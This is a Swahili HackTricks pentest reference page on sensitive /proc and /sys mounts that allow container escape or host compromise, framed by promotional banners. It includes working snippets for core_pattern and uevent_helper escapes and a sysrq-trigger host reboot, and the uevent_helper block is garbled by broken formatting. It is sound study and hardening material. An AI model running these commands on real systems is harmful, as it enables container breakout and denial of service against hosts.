# Vipimo Vyenye Hisia

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Kufichua `/proc` na `/sys` bila kujitenga kwa njia sahihi ya namespace inaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa eneo la mashambulizi na kufichua habari. Direktori hizi zina faili nyeti ambazo, ikiwa hazijasakinishwa vizuri au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko kwenye mwenyeji, au kutoa habari itakayosaidia mashambulizi zaidi. Kwa mfano, kusanidi kimakosa `-v /proc:/host/proc` kunaweza kukiuka ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, kuacha `/host/proc` bila ulinzi.

**Unaweza kupata maelezo zaidi ya kila vuln inayowezekana katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Madokezo ya procfs

### `/proc/sys`

Direktori hii inaruhusu ufikiaji wa kubadilisha vipimo vya kernel, kawaida kupitia `sysctl(2)`, na ina vijitengo kadhaa vya wasiwasi:

#### **`/proc/sys/kernel/core_pattern`**

* Imeelezewa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Inaruhusu kufafanua programu ya kutekelezwa wakati wa kizazi cha faili ya msingi na herufi 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa nambari ikiwa faili inaanza na mrija `|`.
*   **Jaribio la Kujaribu na Utekaji**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Jaribu ufikiaji wa kuandika
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Weka kikandamizi cha desturi
sleep 5 && ./crash & # Kuzindua kikandamizi
```

#### **`/proc/sys/kernel/modprobe`**

* Maelezo zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Ina njia ya mzigo wa moduli ya kernel, inayoitwa kwa ajili ya kupakia moduli za kernel.
*   **Mfano wa Kuangalia Ufikiaji**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Inatajwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Bendera ya ulimwengu inayodhibiti ikiwa kernel inapaniki au inaita OOM killer wakati hali ya OOM inatokea.

#### **`/proc/sys/fs`**

* Kulingana na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), ina chaguo na habari kuhusu mfumo wa faili.
* Ufikiaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukataa huduma dhidi ya mwenyeji.

#### **`/proc/sys/fs/binfmt_misc`**

* Inaruhusu kujiandikisha wachambuzi kwa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
* Inaweza kusababisha ukuaji wa mamlaka au ufikiaji wa shell ya mizizi ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
* Udukuzi na maelezo yanayofaa:
* [Rootkit ya maskini kupitia binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Mafunzo ya kina: [Kiungo cha Video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Vingine katika `/proc`

#### **`/proc/config.gz`**

* Inaweza kufunua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imezimwa.
* Inafaa kwa wadukuzi kutambua mapungufu katika kernel inayotumika.

#### **`/proc/sysrq-trigger`**

* Inaruhusu kuita amri za Sysrq, ikisababisha uanzishaji wa haraka wa mfumo au hatua zingine muhimu.
*   **Mfano wa Kuwasha Upya Mwenyeji**:

```bash
echo b > /proc/sysrq-trigger # Inawasha upya mwenyeji
```

#### **`/proc/kmsg`**

* Inafichua ujumbe wa pete ya kernel.
* Inaweza kusaidia katika udukuzi wa kernel, kuvuja kwa anwani, na kutoa habari nyeti ya mfumo.

#### **`/proc/kallsyms`**

* Inaorodhesha ishara zilizosafirishwa za kernel na anwani zao.
* Muhimu kwa maendeleo ya udukuzi wa kernel, hasa kwa kushinda KASLR.
* Taarifa za anwani zinazuiliwa na `kptr_restrict` ikiwa imewekwa kama `1` au `2`.
* Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Inashirikiana na kifaa cha kumbukumbu ya kernel `/dev/mem`.
* Kihistoria lilikuwa dhaifu kwa mashambulizi ya ukuaji wa mamlaka.
* Zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Inawakilisha kumbukumbu halisi ya mfumo katika muundo wa msingi wa ELF.
* Kusoma kunaweza kufichua kumbukumbu ya mwenyeji na yaliyomo ya kumbukumbu ya kontena zingine.
* Ukubwa mkubwa wa faili unaweza kusababisha matatizo ya kusoma au kuziba kwa programu.
* Matumizi ya kina katika [Kumwaga /proc/kcore mnamo 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Kiolesura mbadala kwa `/dev/kmem`, ikionyesha kumbukumbu ya virtual ya kernel.
* Inaruhusu kusoma na kuandika, hivyo mabadiliko moja kwa moja ya kumbukumbu ya kernel.

#### **`/proc/mem`**

* Kiolesura mbadala kwa `/dev/mem`, ikionyesha kumbukumbu halisi.
* Inaruhusu kusoma na kuandika, mabadiliko ya kumbukumbu yote yanahitaji kutatua anwani za virtual hadi halisi.

#### **`/proc/sched_debug`**

* Inarudi taarifa za ratiba ya mchakato, ikipuuza ulinzi wa nafasi ya PID.
* Inafichua majina ya mchakato, vitambulisho vya ID, na kitambulisho cha cgroup.

#### **`/proc/[pid]/mountinfo`**

* Hutoa habari kuhusu pointi za kufunga katika nafasi ya kufunga ya mchakato.
* Inafichua eneo la `rootfs` ya kontena au picha. 

### Madokezo ya sys

#### **`/sys/kernel/uevent_helper`**

* Hutumiwa kushughulikia vifaa vya kernel `uevents`.
* Kuandika kwa `/sys/kernel/uevent_helper` kunaweza kutekeleza hati za kubahatisha wakati wa kichocheo cha `uevent`.
*   **Mfano wa Utekaji**: %%%bash

#### Unda mzigo

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Pata njia ya mwenyeji kutoka kwa mlima wa OverlayFS kwa kontena

njia\_ya\_mwenyeji=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Weka uevent\_helper kwa msaidizi wa kudanganya

echo "$njia\_ya\_mwenyeji/evil-helper" > /sys/kernel/uevent\_helper

#### Kichocheo cha uevent

echo change > /sys/class/mem/null/uevent

#### Soma matokeo

cat /output %%%
#### **`/sys/class/thermal`**

* Inadhibiti mipangilio ya joto, ikisababisha mashambulizi ya DoS au uharibifu wa kimwili.

#### **`/sys/kernel/vmcoreinfo`**

* Inavuja anwani za kernel, ikisababisha uwezekano wa kuhatarisha KASLR.

#### **`/sys/kernel/security`**

* Ina `securityfs` interface, ikiruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
* Upatikanaji unaweza kuwezesha kontena kulegeza mfumo wake wa MAC.

#### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**

* Inafunua interfaces za kuingiliana na vipengele vya EFI katika NVRAM.
* Kutokuwa sawa kwa usanidi au kutumia vibaya kunaweza kusababisha kompyuta ndogo zilizoharibika au mashine za mwenyeji zisizoweza kuanza.

#### **`/sys/kernel/debug`**

* `debugfs` inatoa interface ya kudebug "bila sheria" kwa kernel.
* Historia ya masuala ya usalama kutokana na asili yake isiyo na kizuizi.

### Marejeo

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Kuelewa na Kufanya Linux Containers Kuwa Imara](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Kutumia Vibaya Linux Containers Zenye Mamlaka na Zisizo na Mamlaka](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
